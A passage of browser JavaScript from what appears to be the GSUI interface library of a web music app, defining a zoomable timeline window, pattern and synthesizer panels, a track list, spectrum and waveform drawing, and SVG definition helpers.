			} break;
		}
	}
	_onclickStep() {
		const v = +this.getAttribute( "step" ),
			frac =
				v >= 1 ? 2 :
				v >= .5 ? 4 :
				v >= .25 ? 8 : 1;

		this.setAttribute( "step", 1 / frac );
	}
	_onwheel( e ) {
		if ( e.ctrlKey ) {
			const ppb = this._pxPerBeat,
				min = +this.getAttribute( "pxperbeatmin" ) || 8,
				max = +this.getAttribute( "pxperbeatmax" ) || 512,
				offpx = parseInt( this._elPanel.style.minWidth ),
				mousepx = e.pageX - this.getBoundingClientRect().left - offpx,
				scrollPpb = this.scrollLeft / ppb,
				mul = e.deltaY > 0 ? .9 : 1.1,
				ppbNew = Math.round( Math.min( Math.max( min, ppb * mul ), max ) );

			e.preventDefault();
			if ( ppbNew !== ppb ) {
				const scrollIncr = mousepx / ppb * ( ppbNew - ppb );

				this.setAttribute( "pxperbeat", ppbNew );
				this.scrollLeft = scrollPpb * ppbNew + scrollIncr;
				GSUI.dispatchEvent( this, "gsuiTimewindow", "pxperbeat", ppbNew );
			}
		}
	}
	_onwheelPanel( e ) {
		if ( e.ctrlKey ) {
			const lh = this._lineHeight,
				min = +this.getAttribute( "lineheightmin" ) || 24,
				max = +this.getAttribute( "lineheightmax" ) || 256,
				offpx = parseInt( this._elTimeline.clientHeight ),
				mousepx = e.pageY - this.getBoundingClientRect().top - offpx,
				scrollLh = this.scrollTop / lh,
				mul = e.deltaY > 0 ? .9 : 1.1,
				lhNew = Math.round( Math.min( Math.max( min, lh * mul ), max ) );

			e.preventDefault();
			if ( lhNew !== lh ) {
				const scrollIncr = mousepx / lh * ( lhNew - lh );

				this.setAttribute( "lineheight", lhNew );
				this.scrollTop = scrollLh * lhNew + scrollIncr;
				GSUI.dispatchEvent( this, "gsuiTimewindow", "lineheight", lhNew );
			}
		}
	}
	_onmousedownExtend( panel, e ) {
		GSUI.unselectText();
		if ( panel === "side" ) {
			this._panelSize = this._elPanel.clientWidth;
			this._mousedownPageX = e.pageX;
			GSUI.dragshield.show( "ew-resize" );
			document.addEventListener( "mousemove", this._onmousemoveExtendPanel );
		} else {
			this._panelSize = this._elDown.clientHeight;
			this._mousedownPageY = e.pageY;
			GSUI.dragshield.show( "ns-resize" );
			document.addEventListener( "mousemove", this._onmousemoveExtendDownPanel );
		}
		document.addEventListener( "mouseup", this._onmouseupExtend );
	}
	_onmousemoveExtendPanel( e ) {
		const w = this._panelSize + ( e.pageX - this._mousedownPageX ),
			min = +this.getAttribute( "panelsizemin" ) || 50,
			max = +this.getAttribute( "panelsizemax" ) || 260,
			w2 = Math.max( min, Math.min( w, max ) );

		this._elPanel.style.minWidth = `${ w2 }px`;
	}
	_onmousemoveExtendDownPanel( e ) {
		const h = this._panelSize + ( this._mousedownPageY - e.pageY ),
			min = +this.getAttribute( "downpanelsizemin" ) || 50,
			max = +this.getAttribute( "downpanelsizemax" ) || 260,
			h2 = Math.max( min, Math.min( h, max ) );

		this._elPanelDown.style.height =
		this._elDown.style.height = `${ h2 }px`;
	}
	_onmouseupExtend() {
		document.removeEventListener( "mousemove", this._onmousemoveExtendDownPanel );
		document.removeEventListener( "mousemove", this._onmousemoveExtendPanel );
		document.removeEventListener( "mouseup", this._onmouseupExtend );
		GSUI.dragshield.hide();
	}
}

customElements.define( "gsui-timewindow", gsuiTimewindow );

GSUI.setTemplate( "gsui-patterns-pattern", () => (
	GSUI.createElement( "div", { class: "gsuiPatterns-pattern", draggable: "true" },
		GSUI.createElement( "div", { class: "gsuiPatterns-pattern-grip gsuiIcon", "data-icon": "grip-v" } ),
		GSUI.createElement( "div", { class: "gsuiPatterns-pattern-head" },
			GSUI.createElement( "div", { class: "gsuiPatterns-pattern-info" },
				GSUI.createElement( "div", { class: "gsuiPatterns-pattern-name" } ),
				GSUI.createElement( "i", { class: "gsuiPatterns-destArrow gsuiIcon", "data-icon": "arrow-right" } ),
				GSUI.createElement( "button", { class: "gsuiPatterns-btnSolid gsuiPatterns-pattern-dest", "data-action": "redirect", title: "Redirect this pattern" },
					GSUI.createElement( "i", { class: "gsuiPatterns-btnIcon gsuiIcon", "data-icon": "mixer" } ),
					GSUI.createElement( "span", { class: "gsuiPatterns-btnText" } ),
				),
			),
			GSUI.createElement( "button", { class: "gsuiPatterns-pattern-btn gsuiIcon", "data-action": "clone", "data-icon": "clone", title: "Clone this pattern" } ),
			GSUI.createElement( "button", { class: "gsuiPatterns-pattern-btn gsuiIcon", "data-action": "remove", "data-icon": "close", title: "Delete this pattern" } ),
		),
		GSUI.createElement( "div", { class: "gsuiPatterns-pattern-content" } ),
		GSUI.createElement( "div", { class: "gsuiPatterns-pattern-placeholder" },
			GSUI.createElement( "i", { class: "gsuiPatterns-pattern-placeholderIcon gsuiIcon", "data-icon": "file-corrupt" } ),
			GSUI.createElement( "span", { class: "gsuiPatterns-pattern-placeholderText" }, "missing data" ),
		),
	)
) );

GSUI.setTemplate( "gsui-patterns-synth", () => (
	GSUI.createElement( "div", { class: "gsuiPatterns-synth" },
		GSUI.createElement( "div", { class: "gsuiPatterns-synth-head" },
			GSUI.createElement( "button", { class: "gsuiPatterns-synth-btn gsuiPatterns-synth-expand gsuiIcon", "data-action": "expand", "data-icon": "caret-right" } ),
			GSUI.createElement( "div", { class: "gsuiPatterns-synth-info" },
				GSUI.createElement( "div", { class: "gsuiPatterns-synth-name" } ),
				GSUI.createElement( "i", { class: "gsuiPatterns-destArrow gsuiIcon", "data-icon": "arrow-right" } ),
				GSUI.createElement( "button", { class: "gsuiPatterns-btnSolid gsuiPatterns-synth-dest", "data-action": "redirect", title: "Redirect this synthesizer" },
					GSUI.createElement( "i", { class: "gsuiPatterns-btnIcon gsuiIcon", "data-icon": "mixer" } ),
					GSUI.createElement( "span", { class: "gsuiPatterns-btnText" } ),
				),
			),
			GSUI.createElement( "button", { class: "gsuiPatterns-synth-btn gsuiIcon", "data-action": "newPattern", "data-icon": "plus", title: "Create a new pattern with this synthesizer" } ),
			GSUI.createElement( "button", { class: "gsuiPatterns-synth-btn gsuiIcon", "data-action": "delete", "data-icon": "close", title: "Delete the synthesizer and its patterns" } ),
		),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholderToCheck gsuiPatterns-synth-patterns" },
			GSUI.createElement( "div", { class: "gsuiPatterns-placeholder" },
				GSUI.createElement( "span", null, "this synthesizer has no related pattern" ),
			),
		),
	)
) );

GSUI.setTemplate( "gsui-patterns", () => [
	GSUI.createElement( "div", { class: "gsuiPatterns-panel gsuiPatterns-panelBuffers" },
		GSUI.createElement( "div", { class: "gsuiPatterns-panel-menu" },
			GSUI.createElement( "i", { class: "gsuiPatterns-panel-icon gsuiIcon", "data-icon": "waveform" } ),
			GSUI.createElement( "span", { class: "gsuiPatterns-panel-title" }, "samples" ),
		),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholderToCheck gsuiPatterns-panel-list" } ),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholder" },
			GSUI.createElement( "span", null, "drag 'n drop raw files here (mp3, ogg, wav)" ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiPatterns-panel gsuiPatterns-panelDrums" },
		GSUI.createElement( "div", { class: "gsuiPatterns-panel-menu" },
			GSUI.createElement( "i", { class: "gsuiPatterns-panel-icon gsuiIcon", "data-icon": "drums" } ),
			GSUI.createElement( "span", { class: "gsuiPatterns-panel-title" }, "drums" ),
			GSUI.createElement( "button", { class: "gsuiPatterns-btnSolid", "data-action": "newDrums", title: "Create a new drums pattern" },
				GSUI.createElement( "i", { class: "gsuiPatterns-btnIcon gsuiIcon", "data-icon": "plus" } ),
				GSUI.createElement( "span", { class: "gsuiPatterns-btnText" }, "new drums" ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholderToCheck gsuiPatterns-panel-list" } ),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholder" },
			GSUI.createElement( "span", null, "no drums yet" ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiPatterns-panel gsuiPatterns-panelKeys" },
		GSUI.createElement( "div", { class: "gsuiPatterns-panel-menu" },
			GSUI.createElement( "i", { class: "gsuiPatterns-panel-icon gsuiIcon", "data-icon": "oscillator" } ),
			GSUI.createElement( "span", { class: "gsuiPatterns-panel-title" }, "keys" ),
			GSUI.createElement( "button", { class: "gsuiPatterns-btnSolid", "data-action": "newSynth", title: "Create a new synthesizer" },
				GSUI.createElement( "i", { class: "gsuiPatterns-btnIcon gsuiIcon", "data-icon": "plus" } ),
				GSUI.createElement( "span", { class: "gsuiPatterns-btnText" }, "new synth" ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholderToCheck gsuiPatterns-panel-list" } ),
		GSUI.createElement( "div", { class: "gsuiPatterns-placeholder" },
			GSUI.createElement( "span", null, "no synth yet" ),
		),
	),
] );

class gsuiPatterns extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-patterns" ),
			[ elPanelBuffers, elPanelDrums, elPanelKeys ] = children,
			elNewDrums = elPanelDrums.querySelector( "[data-action='newDrums']" ),
			elNewSynth = elPanelKeys.querySelector( "[data-action='newSynth']" ),
			elBufferList = elPanelBuffers.querySelector( ".gsuiPatterns-panel-list" ),
			elDrumsList = elPanelDrums.querySelector( ".gsuiPatterns-panel-list" ),
			elSynthList = elPanelKeys.querySelector( ".gsuiPatterns-panel-list" ),
			nlKeysLists = elPanelKeys.getElementsByClassName( "gsuiPatterns-synth-patterns" ),
			fnsPattern = Object.freeze( {
				clone: id => this.onchange( "clonePattern", id ),
				remove: id => this.onchange( "removePattern", id ),
				undefined: id => this.onchange( "openPattern", id ),
				redirect: ( id, e ) => this._openChannelsPopup( "redirectPatternBuffer", id, e ),
			} ),
			fnsSynth = Object.freeze( {
				expand: id => this.expandSynth( id ),
				undefined: id => this.onchange( "openSynth", id ),
				redirect: ( id, e ) => this._openChannelsPopup( "redirectSynth", id, e ),
				newPattern: id => {
					this.onchange( "addPatternKeys", id );
					this.expandSynth( id, true );
				},
				delete: id => {
					elSynthList.children.length > 1
						? this.onchange( "removeSynth", id )
						: gsuiPopup.alert( "Error", "You have to keep at least one synthesizer" );
				},
			} );

		super();
		this.onchange =
		this.onpatternDataTransfer = null;
		this._children = children;
		this._elBufferList = elBufferList;
		this._elDrumsList = elDrumsList;
		this._elSynthList = elSynthList;
		this._nlKeysLists = nlKeysLists;
		this._fnsSynth = fnsSynth;
		this._fnsPattern = fnsPattern;
		Object.seal( this );

		new gsuiReorder( {
			rootElement: elBufferList,
			direction: "column",
			dataTransfer: ( ...args ) => this.onpatternDataTransfer( ...args ),
			dataTransferType: "pattern-buffer",
			itemSelector: ".gsuiPatterns-pattern",
			handleSelector: ".gsuiPatterns-pattern-grip",
			parentSelector: ".gsuiPatterns-panel-list",
			onchange: this._onreorderPatterns.bind( this, elBufferList ),
		} );
		new gsuiReorder( {
			rootElement: elDrumsList,
			direction: "column",
			dataTransfer: ( ...args ) => this.onpatternDataTransfer( ...args ),
			dataTransferType: "pattern-drums",
			itemSelector: ".gsuiPatterns-pattern",
			handleSelector: ".gsuiPatterns-pattern-grip",
			parentSelector: ".gsuiPatterns-panel-list",
			onchange: this._onreorderPatterns.bind( this, elDrumsList ),
		} );
		new gsuiReorder( {
			rootElement: elSynthList,
			direction: "column",
			dataTransfer: ( ...args ) => this.onpatternDataTransfer( ...args ),
			dataTransferType: "pattern-keys",
			itemSelector: ".gsuiPatterns-pattern",
			handleSelector: ".gsuiPatterns-pattern-grip",
			parentSelector: ".gsuiPatterns-synth-patterns",
			onchange: this._onreorderPatternsKeys.bind( this ),
		} );
		elSynthList.ondragover = e => {
			const syn = e.target.closest( ".gsuiPatterns-synth" );

			if ( syn ) {
				this.expandSynth( syn.dataset.id, true );
			}
		};
		elSynthList.ondblclick = e => {
			if ( e.target.classList.contains( "gsuiPatterns-synth-info" ) ) {
				this.expandSynth( e.target.closest( ".gsuiPatterns-synth" ).dataset.id );
			}
		};
		elBufferList.onclick =
		elDrumsList.onclick = this._onclickListPatterns.bind( this );
		elSynthList.onclick = this._onclickSynths.bind( this );
		elNewDrums.onclick = () => this.onchange( "addPatternDrums" );
		elNewSynth.onclick = () => this.onchange( "addSynth" );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiPatterns", "gsuiPanels-y" );
			this.append( ...this._children );
			this._children = null;
			( new gsuiPanels( this ) ).attached();
		}
	}

	// .........................................................................
	expandSynth( id, b ) {
		const elSyn = this._getSynth( id ),
			show = elSyn.classList.toggle( "gsuiPatterns-synth-expanded", b );

		elSyn.querySelector( ".gsuiPatterns-synth-expand" ).dataset.icon = `caret-${ show ? "down" : "right" }`;
	}
	reorderPatterns( patterns ) {
		gsuiReorder.listReorder( this._elBufferList, patterns );
		gsuiReorder.listReorder( this._elDrumsList, patterns );
		Array.prototype.forEach.call( this._nlKeysLists, list => {
			gsuiReorder.listReorder( list, patterns );
		} );
	}
	_openChannelsPopup( action, objId, e ) {
		const currChanId = e.target.dataset.id;

		gsuiPatterns.selectChanPopupSelect.value = currChanId;
		gsuiPopup.custom( {
			title: "Channels",
			element: gsuiPatterns.selectChanPopupContent,
			submit: data => {
				if ( data.channel !== currChanId ) {
					this.onchange( action, objId, data.channel );
				}
			}
		} );
	}

	// .........................................................................
	addChannel( id, name ) {
		const elOpt = document.createElement( "option" );

		elOpt.value = id;
		elOpt.textContent = name;
		gsuiPatterns.selectChanPopupSelect.append( elOpt );
	}
	updateChannel( id, name ) {
		gsuiPatterns.selectChanPopupSelect.querySelector( `option[value="${ id }"]` ).textContent = name;
		this.querySelectorAll( `.gsuiPatterns-btnSolid[data-id="${ id }"] .gsuiPatterns-btnText` )
			.forEach( el => el.textContent = name );
	}
	deleteChannel( id ) {
		gsuiPatterns.selectChanPopupSelect.querySelector( `option[value="${ id }"]` ).remove();
	}

	// .........................................................................
	addSynth( id ) {
		const elSyn = GSUI.getTemplate( "gsui-patterns-synth" );

		elSyn.dataset.id = id;
		this._elSynthList.prepend( elSyn );
	}
	changeSynth( id, prop, val ) {
		const elSyn = this._getSynth( id );

		switch ( prop ) {
			case "name": elSyn.querySelector( ".gsuiPatterns-synth-name" ).textContent = val; break;
			case "dest": elSyn.querySelector( ".gsuiPatterns-synth-dest" ).dataset.id = val; break;
			case "destName": elSyn.querySelector( ".gsuiPatterns-synth-dest .gsuiPatterns-btnText" ).textContent = val; break;
		}
	}
	deleteSynth( id ) {
		this._getSynth( id ).remove();
	}

	// .........................................................................
	addPattern( id, { type, synth } ) {
		const elPat = GSUI.getTemplate( "gsui-patterns-pattern" );

		elPat.dataset.id = id;
		if ( type !== "buffer" ) {
			elPat.querySelector( ".gsuiPatterns-destArrow" ).remove();
			elPat.querySelector( ".gsuiPatterns-pattern-dest" ).remove();
		} else {
			elPat.querySelector( "[data-action='clone']" ).remove(); // 1.
		}
		this._getPatternParent( type, synth ).append( elPat );
	}
	changePattern( id, prop, val ) {
		const elPat = this._getPattern( id );

		switch ( prop ) {
			case "order": elPat.dataset.order = val; break;
			case "name": elPat.querySelector( ".gsuiPatterns-pattern-name" ).textContent = val; break;
			case "dest": elPat.querySelector( ".gsuiPatterns-pattern-dest" ).dataset.id = val; break;
			case "destName": elPat.querySelector( ".gsuiPatterns-pattern-dest .gsuiPatterns-btnText" ).textContent = val; break;
			case "synth": this._getPatternParent( "keys", val ).append( elPat ); break;
		}
	}
	appendPatternSVG( id, svg ) {
		svg.classList.add( "gsuiPatterns-pattern-svg" );
		this._getPattern( id ).querySelector( ".gsuiPatterns-pattern-content" ).append( svg );
	}
	deletePattern( id ) {
		const elPat = this._getPattern( id );

		if ( elPat ) { // 2.
			elPat.remove();
		}
	}

	// .........................................................................
	selectPattern( type, id ) {
		const elList = type === "drums"
				? this._elDrumsList
				: this._elSynthList;

		elList.querySelector( ".gsuiPatterns-pattern-selected" )?.classList?.remove( "gsuiPatterns-pattern-selected" );
		this._getPattern( id )?.classList?.add( "gsuiPatterns-pattern-selected" );
	}
	selectSynth( id ) {
		this._elSynthList.querySelector( ".gsuiPatterns-synth-selected" )?.classList?.remove( "gsuiPatterns-synth-selected" );
		this._getSynth( id ).classList.add( "gsuiPatterns-synth-selected" );
	}

	// .........................................................................
	_getSynth( id ) {
		return this._elSynthList.querySelector( `.gsuiPatterns-synth[data-id="${ id }"]` );
	}
	_getPattern( id ) {
		return this.querySelector( `.gsuiPatterns-pattern[data-id="${ id }"]` );
	}
	_getPatternParent( type, synthId ) {
		switch ( type ) {
			case "buffer": return this._elBufferList;
			case "drums": return this._elDrumsList;
			case "keys": return this._elSynthList.querySelector( `.gsuiPatterns-synth[data-id="${ synthId }"] .gsuiPatterns-synth-patterns` );
		}
	}

	// .........................................................................
	_onreorderPatterns( list, elPat ) {
		this.onchange( "reorderPattern", elPat.dataset.id,
			gsuiReorder.listComputeOrderChange( list, {} ) );
	}
	_onreorderPatternsKeys( elPat, indA, indB, parA, parB ) {
		if ( parA === parB ) {
			this._onreorderPatterns( parA, elPat );
		} else {
			const patId = elPat.dataset.id,
				synth = parB.parentNode.dataset.id,
				patterns = { [ patId ]: { synth } };

			gsuiReorder.listComputeOrderChange( parA, patterns );
			gsuiReorder.listComputeOrderChange( parB, patterns );
			this.onchange( "redirectPatternKeys", patId, synth, patterns );
		}
	}
	_onclickListPatterns( e ) {
		const pat = e.target.closest( ".gsuiPatterns-pattern" );

		if ( pat ) {
			this._fnsPattern[ e.target.dataset.action ]( pat.dataset.id, e );
			return false;
		}
	}
	_onclickSynths( e ) {
		if ( this._onclickListPatterns( e ) !== false ) {
			const syn = e.target.closest( ".gsuiPatterns-synth" );

			if ( syn ) {
				this._fnsSynth[ e.target.dataset.action ]( syn.dataset.id, e );
			}
		}
	}
}

gsuiPatterns.selectChanPopupSelect = GSUI.createElement( "select", { id: "gsuiPatterns-selectChanPopupSelect", size: 8, name: "channel" } );
gsuiPatterns.selectChanPopupContent = (
	GSUI.createElement( "div", { class: "popup", id: "gsuiPatterns-selectChanPopupContent" },
		GSUI.createElement( "fieldset",
			GSUI.createElement( "legend", null, "Select a channel" ),
			gsuiPatterns.selectChanPopupSelect,
		),
	)
);

Object.freeze( gsuiPatterns );

customElements.define( "gsui-patterns", gsuiPatterns );

/*
1. The cloning feature for the patterns of type buffer is removed because it's for the moment useless.
2. We are checking if the pattern exists because the entire synth could have been removed before.
*/

GSUI.setTemplate( "gsui-track", () => [
	GSUI.createElement( "button", { class: "gsuiTrack-toggle gsuiIcon", "data-action": "toggle", "data-icon": "toggle", title: "toggle track" } ),
	GSUI.createElement( "div", { class: "gsuiTrack-nameWrap" },
		GSUI.createElement( "input", { class: "gsuiTrack-name", "data-action": "rename", type: "text", disabled: "", spellcheck: "false" } ),
	),
] );

GSUI.setTemplate( "gsui-track-row", () => (
	GSUI.createElement( "div", { class: "gsuiTrack-row gsui-row" },
		GSUI.createElement( "div" ),
	)
) );

class gsuiTrack extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-track" );

		super();
		this.rowElement = GSUI.getTemplate( "gsui-track-row" );
		this._children = children;
		this._inpName = children[ 1 ].firstChild;
		Object.seal( this );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiTrack" );
			this.append( ...this._children );
			this._children = null;
		}
	}
	static get observedAttributes() {
		return [ "toggle", "name", "order" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "toggle":
					this.classList.toggle( "gsui-mute", val === null );
					this.rowElement.classList.toggle( "gsui-mute", val === null );
					break;
				case "name":
					this._inpName.value = val;
					break;
				case "order":
					this.dataset.order = val;
					this._inpName.placeholder = `track ${ +val + 1 }`;
					break;
			}
		}
	}
}

customElements.define( "gsui-track", gsuiTrack );

class gsuiTracklist {
	constructor() {
		const root = GSUI.createElement( "div", { class: "gsuiTracklist" } );

		this.rootElement = root;
		this._tracks = new Map();
		Object.seal( this );

		root.oncontextmenu = () => false;
		root.onchange = this._onchange.bind( this );
		root.onkeydown = this._onkeydown.bind( this );
		root.ondblclick = this._ondblclick.bind( this );
		root.onmousedown = this._onmousedown.bind( this );
		root.addEventListener( "focusout", this._onfocusout.bind( this ) );
	}

	// .........................................................................
	getTrack( id ) {
		return this._tracks.get( id );
	}
	addTrack( id ) {
		const tr = GSUI.createElement( "gsui-track" );

		tr.dataset.id =
		tr.rowElement.dataset.id = id;
		this._tracks.set( id, tr );
		this.rootElement.append( tr );
		return tr;
	}
	removeTrack( id ) {
		const tr = this._tracks.get( id );

		tr.remove();
		tr.rowElement.remove();
		this._tracks.delete( id );
	}

	// .........................................................................
	_onkeydown( e ) {
		const inp = e.target;

		if ( inp.dataset.action === "rename" ) {
			e.stopPropagation();
			switch ( e.key ) {
				case "Escape": inp.value = inp.parentNode.parentNode.getAttribute( "name" );
				case "Enter": inp.blur();
			}
		}
	}
	_onfocusout( e ) {
		if ( e.target.dataset.action === "rename" ) {
			e.target.disabled = true;
		}
	}
	_onchange( e ) {
		const inp = e.target,
			id = inp.parentNode.parentNode.dataset.id,
			name = inp.value.trim();

		inp.disabled = true;
		GSUI.dispatchEvent( this.rootElement, "gsuiTracklist", "renameTrack", id, name );
	}
	_ondblclick( e ) {
		const inp = e.target;

		if ( inp.dataset.action === "rename" ) {
			inp.disabled = false;
			inp.select();
			inp.focus();
		}
	}
	_onmousedown( e ) {
		if ( e.target.dataset.action === "toggle" ) {
			const par = e.target.parentNode,
				id = par.dataset.id;

			if ( e.button === 2 ) {
				GSUI.dispatchEvent( this.rootElement, "gsuiTracklist", "toggleSoloTrack", id );
			} else if ( e.button === 0 ) {
				GSUI.dispatchEvent( this.rootElement, "gsuiTracklist", "toggleTrack", id );
			}
		}
	}
}

class gsuiAnalyser {
	constructor() {
		this.rootElement =
		this._ctx = null;
		Object.seal( this );
	}
	setCanvas( canvas ) {
		this.rootElement = canvas;
		this._ctx = canvas.getContext( "2d" );
	}
	clear() {
		this._ctx.clearRect( 0, 0, this.rootElement.width, this.rootElement.height );
	}
	setResolution( w, h ) {
		const cnv = this.rootElement,
			img = this._ctx.getImageData( 0, 0, cnv.width, cnv.height );

		cnv.width = w;
		cnv.height = h;
		this._ctx.putImageData( img, 0, 0 );
	}
	draw( ldata, rdata ) {
		this._moveImage();
		this._draw( ldata, rdata );
	}

	// private:
	_moveImage() {
		const cnv = this.rootElement,
			img = this._ctx.getImageData( 0, 0, cnv.width, cnv.height - 1 );

		this._ctx.putImageData( img, 0, 1 );
	}
	_draw( ldata, rdata ) {
		const ctx = this._ctx,
			w2 = ctx.canvas.width / 2,
			len = Math.min( w2, ldata.length ),
			imgL = gsuiSpectrum.draw( ctx, ldata, w2 ),
			imgR = gsuiSpectrum.draw( ctx, rdata, w2 ),
			imgLflip = ctx.createImageData( len, 1 );

		for ( let x = 0, x2 = len - 1; x < len; ++x, --x2 ) {
			imgLflip.data[ x * 4     ] = imgL.data[ x2 * 4     ];
			imgLflip.data[ x * 4 + 1 ] = imgL.data[ x2 * 4 + 1 ];
			imgLflip.data[ x * 4 + 2 ] = imgL.data[ x2 * 4 + 2 ];
			imgLflip.data[ x * 4 + 3 ] = imgL.data[ x2 * 4 + 3 ];
		}
		ctx.putImageData( imgLflip, 0, 0 );
		ctx.putImageData( imgR, w2, 0 );
	}
}

class gsuiSpectrum {
	constructor() {
		this.rootElement =
		this._ctx = null;
		Object.seal( this );
	}
	setCanvas( cnv ) {
		this.rootElement = cnv;
		this._ctx = cnv.getContext( "2d" );
		cnv.height = 1;
		cnv.classList.add( "gsuiSpectrum" );
	}
	clear() {
		this._ctx.clearRect( 0, 0, this.rootElement.width, 1 );
	}
	setResolution( w ) {
		this.rootElement.width = w;
		this.rootElement.height = 1;
	}
	draw( data ) {
		this._ctx.putImageData( gsuiSpectrum.draw( this._ctx, data, this.rootElement.width ), 0, 0 );
	}
}

gsuiSpectrum.draw = function( ctx, data, width = data.length ) {
	const img = ctx.createImageData( width, 1 ),
		imgData = img.data,
		datalen = data.length;
	let diSave = -1;

	for ( let i = 0; i < width; ++i ) {
		const x = i * 4,
			di = Math.max( Math.round( datalen * ( 2 ** ( ( i / width ) * 11 - 11 ) ) ), diSave + 1 ),
			datum = 1 - Math.cos( data[ di ] / 255 * Math.PI / 2 );

		diSave = di;
		if ( datum < .05 ) {
			imgData[ x     ] = 4 + 10 * datum | 0;
			imgData[ x + 1 ] = 4 + 10 * datum | 0;
			imgData[ x + 2 ] = 5 + 20 * datum | 0;
		} else {
			const colId = gsuiSpectrum._datumDivision.findIndex( x => datum < x ),
				col = gsuiSpectrum.colors[ colId ],
				datumCut = datum / col[ 3 ];

			imgData[ x     ] = col[ 0 ] * datumCut | 0;
			imgData[ x + 1 ] = col[ 1 ] * datumCut | 0;
			imgData[ x + 2 ] = col[ 2 ] * datumCut | 0;
		}
		imgData[ x + 3 ] = 255;
	}
	return img;
};

gsuiSpectrum._datumDivision = [ .08, .15, .17, .25, .3, .4, .6, .8, Infinity ];
gsuiSpectrum.colors = [
	[   5,   2,  20, .08 ], // 0
	[   8,   5,  30, .15 ], // 1
	[  15,   7,  50, .17 ], // 2
	[  75,   7,  35, .25 ],   // 3
	[  80,   0,   0, .3  ],   // 4
	[ 180,   0,   0, .4  ],   // 5
	[ 200,  25,  10, .6  ], // 6
	[ 200, 128,  10, .8  ], // 7
	[ 200, 200,  20, 1   ], // 8
];

class gsuiSVGDefs {
	constructor() {
		const svg = gsuiSVGDefs.create( "svg" );

		this.rootElement = svg;
		this._defs = new Map();
		this._idPref = `gsuiSVGDefs_${ gsuiSVGDefs._id++ }_`;
		this._elDefs = gsuiSVGDefs.create( "defs" );
		this._optResolution = 0;
		this._w =
		this._h = 0;
		Object.seal( this );

		svg.style.display = "none";
		svg.classList.add( "gsuiSVGDefs" );
		svg.append( this._elDefs );
		document.body.prepend( svg );
	}

	static create( elem ) {
		return document.createElementNS( "http://www.w3.org/2000/svg", elem );
	}

	setDefaultViewbox( w, h ) {
		this._w = w;
		this._h = h;
	}
	empty() {
		this._defs.forEach( def => def.g.remove() );
		this._defs.clear();
	}
	delete( id ) {
		this._defs.get( id ).g.remove();
		this._defs.delete( id );
	}
	add( id, w = 0, h = 0, ...elems ) {
		if ( this._defs.has( id ) ) {
			console.error( `gsuiSVGDefs: ID "${ id }" already used` );
		} else {
			const g = gsuiSVGDefs.create( "g" );

			g.id = `${ this._idPref }${ id }`;
			g.append( ...elems );
			this._elDefs.append( g );
			this._defs.set( id, { g, w, h } );
		}
	}
	update( id, w, h, ...elems ) {
		const def = this._defs.get( id ),
			g = def.g;

		def.w = w;
		def.h = h;
		while ( g.lastChild ) {
			g.lastChild.remove();
		}
		g.append( ...elems );
	}
	createSVG( id ) {
		const svg = gsuiSVGDefs.create( "svg" ),
			use = gsuiSVGDefs.create( "use" ),
			def = this._defs.get( id ) || {},
			viewBox = `0 0 ${ def.w || this._w } ${ def.h || this._h }`;

		svg.dataset.id = id;
		use.setAttributeNS( "http://www.w3.org/1999/xlink", "href", `#${ this._idPref }${ id }` );
		svg.setAttribute( "viewBox", viewBox );
		svg.setAttribute( "preserveAspectRatio", "none" );
		svg.append( use );
		return svg;
	}
	setSVGViewbox( svg, x, w ) {
		const h = this._defs.get( svg.dataset.id ).h;

		svg.setAttribute( "viewBox", `${ x } 0 ${ w } ${ h }` );
	}
}

gsuiSVGDefs._id = 0;

class gsuiWaveform {
	constructor( el ) {
		const svg = el || document.createElementNS( "http://www.w3.org/2000/svg", "svg" ),
			poly = svg.querySelector( "polygon" );

		this.rootElement = svg;
		this.polygon = poly;
		this.width =
		this.height = 0;
		Object.seal( this );

		svg.setAttribute( "preserveAspectRatio", "none" );
		svg.classList.add( "gsuiWaveform" );
		if ( !poly ) {
			this.polygon = document.createElementNS( "http://www.w3.org/2000/svg", "polygon" );
			svg.append( this.polygon );
		}
	}

	remove() {
		this.empty();
		this.rootElement.remove();
	}
	empty() {
		this.polygon.removeAttribute( "points" );
	}
	setResolution( w, h ) {
		this.width = w;
		this.height = h;
		this.rootElement.setAttribute( "viewBox", `0 0 ${ w } ${ h }` );
	}
	drawBuffer( buf, offset, duration ) {
		gsuiWaveform.drawBuffer( this.polygon, this.width, this.height, buf, offset, duration );
	}
}

gsuiWaveform.drawBuffer = function( polygon, w, h, buf, offset, duration ) {
	const d0 = buf.getChannelData( 0 ),
		d1 = buf.numberOfChannels > 1 ? buf.getChannelData( 1 ) : d0,
		off = offset || 0,
		dur = duration || buf.duration - off;

	gsuiWaveform.draw( polygon, w, h, d0, d1, buf.duration, off, dur );
};

gsuiWaveform.draw = function( polygon, w, h, data0, data1, bufferDuration, offset, duration ) {
	const h2 = h / 2,
		step = duration / bufferDuration * data0.length / w,
		ind = ~~( offset / bufferDuration * data0.length ),
		iinc = ~~Math.max( 1, step / 100 );
	let dots0 = `0,${ h2 + data0[ ind ] * h2 }`,
		dots1 = `0,${ h2 + data1[ ind ] * h2 }`;

	for ( let p = 1; p < w; ++p ) {
		let lmin = Infinity,
			rmax = -Infinity,
			i = ~~( ind + ( p - 1 ) * step );
		const iend = i + step;

		for ( ; i < iend; i += iinc ) {
			lmin = Math.min( lmin, data0[ i ], data1[ i ] );
			rmax = Math.max( rmax, data0[ i ], data1[ i ] );
		}
		if ( Math.abs( rmax - lmin ) * h2 < 1 ) {
			rmax += 1 / h;
			lmin -= 1 / h;
		}
		dots0 += ` ${ p },${ h2 + lmin * h2 }`;
		dots1  =  `${ p },${ h2 + rmax * h2 } ${ dots1 }`;
	}
	polygon.setAttribute( "points", `${ dots0 } ${ dots1 }` );
};

class gsuiWaveforms extends gsuiSVGDefs {
	hdMode( b ) {
		this._optResolution = b ? Infinity : 48;
	}
